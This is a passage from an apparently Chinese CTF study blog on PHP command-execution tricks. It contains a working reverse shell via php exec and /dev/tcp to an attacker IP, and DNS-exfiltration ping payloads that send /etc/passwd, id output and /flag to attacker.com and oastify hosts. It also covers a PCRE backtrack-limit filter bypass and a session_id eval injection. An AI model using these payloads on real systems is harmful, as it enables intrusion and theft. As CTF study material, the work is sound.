<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tac flag.php||ls;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>



<h2 id="8-无回显RCE"><a href="#8-无回显RCE" class="headerlink" title="8.无回显RCE"></a>8.无回显RCE</h2><p>报应来了，之前他们在说反弹shell和dnslog外带的时候不知道是什么东西，原来是用来解无回显RCE的</p>
<h3 id="1-反弹shell"><a href="#1-反弹shell" class="headerlink" title="1.反弹shell"></a>1.反弹shell</h3><p>我们只学了php，所以只看php反弹shell和bash命令</p>
<p>首先最简单的一个办法，就是使用php的exec函数执行反弹shell</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击者：nc -nvlp <span class="number">9875</span></span><br><span class="line"></span><br><span class="line">受害者：php -r <span class="string">&#x27;exec(&quot;/usr/bin/bash -i &gt;&amp; /dev/tcp/192.168.239.128/9875 0&gt;&amp;1&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>现在我们来了解下这个bash命令的原理</p>
<p><strong>命令释义</strong></p>
<p>攻击者监听端口</p>
<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 9999</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>nc是netcat的简写，可实现任意TCP&#x2F;UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口<br>-l 监听模式，用于入站连接<br>-v 详细输出–用两个-v可得到更详细的内容<br>-p port 本地端口号</p>
<p>受害者将输入和输出重定向到攻击者主机</p>
<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.239.128/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>bash -i代表在本地打开一个bash</p>
<p>&amp;后面跟上&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port这个文件代表<strong>将标准输出和标准错误输出重定向到这个文件</strong>，也就是传递到远程vps</p>
<p>&#x2F;dev&#x2F;tcp&#x2F;是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接</p>
<p>远程vps开启对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出</p>
<p>inux文件描述符：linux shell下有三种标准的文件描述符，分别如下：<br>0 - stdin 代表标准输入,使用&lt;或&lt;&lt;<br>1 - stdout 代表标准输出,使用&gt;或&gt;&gt;<br>2 - stderr 代表标准错误输出,使用2&gt;或2&gt;&gt;</p>
<p>意思就是通过两次输出重定向至文件，分别实现输出和输入的重定向。</p>
<p>第一次把输出重定向至我们的攻击服务器，第二次把输入重定向至输出，也就相当于重定向至攻击者</p>
<h3 id="2-重定向符"><a href="#2-重定向符" class="headerlink" title="2.重定向符"></a>2.重定向符</h3><p>当我们没有回显的时候也可以选择使用重定向符将回显写入指定文件然后下载读取即可</p>
<ul>
<li>**<code>&gt;</code>**：覆盖输出到文件。</li>
<li>**<code>&gt;&gt;</code>**：追加输出到文件。</li>
<li>**<code>&lt;</code>**：从文件读取输入。</li>
<li>**<code>2&gt;</code>**：重定向标准错误。</li>
<li>**<code>&amp;&gt;</code>**：重定向标准输出和标准错误。</li>
<li>**<code>|</code>**：将一个命令的输出传递给另一个命令。</li>
</ul>
<p><strong>1.输出重定向</strong></p>
<p>**<code>&gt;</code>**：将命令的输出重定向到文件，覆盖文件内容。</p>
<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Hello, World!&quot;</span> &gt; output.txt</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>如果<code>output.txt</code>不存在，则创建；若存在，内容将被覆盖。</p>
<p>**<code>&gt;&gt;</code>**：将命令的输出追加到文件末尾。</p>
<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Hello again!&quot;</span> &gt;&gt; output.txt</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>如果文件不存在，则创建；若存在，内容将追加到文件末尾。</p>
<p><strong>2.输入重定向</strong></p>
<p>**<code>&lt;</code>**：将文件内容作为命令的输入。</p>
<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">wc</span> -l &lt; input.txt</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>统计<code>input.txt</code>的行数。</p>
<p><strong>3.错误重定向</strong></p>
<p>**<code>2&gt;</code>**：将标准错误重定向到文件，覆盖文件内容。</p>
<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> non_existent_file 2&gt; error.log</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<ul>
<li>如果文件不存在，错误信息将写入<code>error.log</code>，覆盖原有内容。</li>
<li>**<code>2&gt;&gt;</code>**：将标准错误追加到文件末尾。</li>
</ul>
<p><strong>4. 同时重定向标准输出和标准错误</strong></p>
<p>**<code>&amp;&gt;</code>**：将标准输出和标准错误都重定向到文件，覆盖文件内容。</p>
<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> non_existent_file &amp;&gt; output.log</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<ul>
<li>输出和错误信息都将写入<code>output.log</code>，覆盖原有内容。</li>
<li>**<code>&amp;&gt;&gt;</code>**：将标准输出和标准错误都追加到文件末尾。</li>
</ul>
<h3 id="3-dnslog外带"><a href="#3-dnslog外带" class="headerlink" title="3.dnslog外带"></a>3.dnslog外带</h3><p>dns是域名解析，dnslog则是域名解析日志，会储存着所有解析过的域名，我们利用这个特性可以拿到一些无回显的信息</p>
<p>原理就是域名解析是从右到左，我们可以通过在域名左边带上一些无回显信息去进行dns解析，系统在遇到dnslog的域名时会认为这是一个普通域名而让其去访问</p>
<p>系统执行命令的时候会让查询结果和dns域名一起去访问dnslog网站，通过解析会在dnslong中储存着，我们因此能够拿到查询结果</p>
<p>但是我能拿到的dnslog网站我基本上都失败了，还有真的会有网站设置可以让你外带吗，但是还是要试下</p>
<p><strong>ping命令</strong></p>
<p><code>ping</code> 是 Linux 中最常用的网络诊断工具之一，用于测试主机之间的网络连通性。它通过发送 ICMP (Internet Control Message Protocol) <strong>回显请求包</strong>到目标主机，并等待 ICMP 回显应答。</p>
<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping [选项] 目标主机</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<div class="table-container"><table>
<thead>
<tr>
<th align="left">选项</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>-c &lt;次数&gt;</code></td>
<td align="left">指定发送的 ping 请求次数</td>
</tr>
<tr>
<td align="left"><code>-i &lt;秒数&gt;</code></td>
<td align="left">设置 ping 包发送间隔时间</td>
</tr>
<tr>
<td align="left"><code>-s &lt;大小&gt;</code></td>
<td align="left">设置发送的 ping 包大小（字节）</td>
</tr>
<tr>
<td align="left"><code>-t &lt;TTL&gt;</code></td>
<td align="left">设置数据包的生存时间 (Time To Live)</td>
</tr>
<tr>
<td align="left"><code>-w &lt;秒数&gt;</code></td>
<td align="left">设置超时时间（秒）</td>
</tr>
<tr>
<td align="left"><code>-q</code></td>
<td align="left">安静模式，只显示摘要信息</td>
</tr>
<tr>
<td align="left"><code>-v</code></td>
<td align="left">详细输出</td>
</tr>
<tr>
<td align="left"><code>-4</code></td>
<td align="left">强制使用 IPv4</td>
</tr>
<tr>
<td align="left"><code>-6</code></td>
<td align="left">强制使用 IPv6</td>
</tr>
<tr>
<td align="left"><code>-f</code></td>
<td align="left">洪水 ping (快速连续发送，仅限 root 用户)</td>
</tr>
</tbody></table></div>
<p>一些使用语句</p>
<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ping example.com</span><br><span class="line"></span><br><span class="line">ping -c 5 example.com <span class="comment">#指定请求次数</span></span><br><span class="line"></span><br><span class="line">ping -s 1000 example.com  <span class="comment"># 发送 1000 字节的包</span></span><br><span class="line"></span><br><span class="line">ping -i 2 example.com  <span class="comment"># 每 2 秒 ping 一次</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>我们再收集一些payload</p>
<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ping -c 1 $(<span class="built_in">id</span> | <span class="built_in">base64</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;\n&#x27;</span>).attacker.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># Base64编码后传输（避免域名非法字符）</span></span><br><span class="line">ping $(<span class="built_in">echo</span> <span class="string">&quot;result&quot;</span> | <span class="built_in">base64</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;=&#x27;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;\n&#x27;</span>).attacker.com</span><br><span class="line"><span class="comment"># 示例：外带/etc/passwd的前20字符</span></span><br><span class="line">ping $(<span class="built_in">head</span> -c 20 /etc/passwd | <span class="built_in">base64</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;\n&#x27;</span>).attacker.com</span><br><span class="line"></span><br><span class="line">ping $(<span class="built_in">cat</span> /flag | <span class="built_in">base64</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;\n=&#x27;</span>).4lqd0ugbqz0z5cabk74tycp6mxsogn4c.oastify.com</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>





<h2 id="9-PCRE回溯次数限制绕过-正则溢出"><a href="#9-PCRE回溯次数限制绕过-正则溢出" class="headerlink" title="9.PCRE回溯次数限制绕过(正则溢出)"></a>9.PCRE回溯次数限制绕过(正则溢出)</h2><p>这个我之前在写题目的时候遇到过这种解法，但是当时只知道在前面加100万个不匹配字符就可以绕过正则匹配，但是不知道这里面的原理</p>
<p>我们现在来看一下</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, <span class="variable">$data</span>);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_php</span>(<span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="comment">// fwrite($f, $input); ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>正则表达式是一个可以被“有限状态自动机”接受的语言类。</p>
<p>“有限状态自动机”，其拥有有限数量的状态，每个状态可以迁移到零个或多个状态，输入字串决定执行哪个状态的迁移。</p>
<p>而常见的正则引擎，又被细分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机）。他们匹配输入的过程分别是：</p>
<ul>
<li>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入</li>
<li>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</li>
</ul>
<p>由于NFA的执行过程存在回溯，所以其性能会劣于DFA，但它支持更多功能。大多数程序语言都使用了NFA作为正则引擎，其中也包括PHP使用的PCRE库。</p>
<p>php使用的是NFA进行正则匹配，但是介绍有点不明白，我的理解就是正则表达式和字符串同时进行匹配，如果中途出现匹配不上的情况则开始回溯，回溯的目的就是尝试其他匹配方式</p>
<p>这里搬下大佬的图</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/02/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/51bfc7bb-fd9a-402e-971a-a2247b226f3d.3adc35af4c1d.png" class title="image.png">

<p>我们可以看见第四次匹配的时候已经全部匹配到了，但是由于后面带有一个[(&#96;;?&gt;].*需要匹配中括号中字符，无法匹配便开始回溯，回溯到13次的时候匹配到;，则继续向后面匹配直到字符串全部匹配，由于每次回溯一个字符所以回溯次数由字符数决定</p>
<p>这也就是为什么需要100万个无关字符，目的是让回溯次数达到100万</p>
<p>回溯次数上限默认是100万。那么，假设我们的回溯次数超过了100万</p>
<p><code>preg_match</code>函数返回false表示此次执行失败了，我们可以调用<code>var_dump(preg_last_error() === PREG_BACKTRACK_LIMIT_ERROR);</code>，发现失败的原因的确是回溯次数超出了限制：</p>
<p>于是我们的字符串就可以通过回溯次数超过限制返回false来绕过正则匹配</p>
<h2 id="10-做题经验和payload"><a href="#10-做题经验和payload" class="headerlink" title="10.做题经验和payload"></a>10.做题经验和payload</h2><p>到最后还是要收集payload，和各种绕过姿势</p>
<p>除了上面提到的各种绕过方法这里就只剩下做题经验了</p>
<h3 id="1-session命令执行"><a href="#1-session命令执行" class="headerlink" title="1.session命令执行"></a>1.session命令执行</h3><p>使用session进行命令执行是我没想到的，原理和跳板差不多，只不过可以不用POST和GET就能跳板</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">urldecode</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>()));</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>通过session_start()启动会话，然后使用session_id()获取当前的会话id，最后eval进行命令执行</p>
<p>由于session_id中不能出现引号，因此通过两次url编码来解决</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHPSESSID=<span class="title function_ invoke__">highlight_file</span>(%<span class="number">2522</span>flag.php%<span class="number">2522</span>)%<span class="number">3</span>B</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 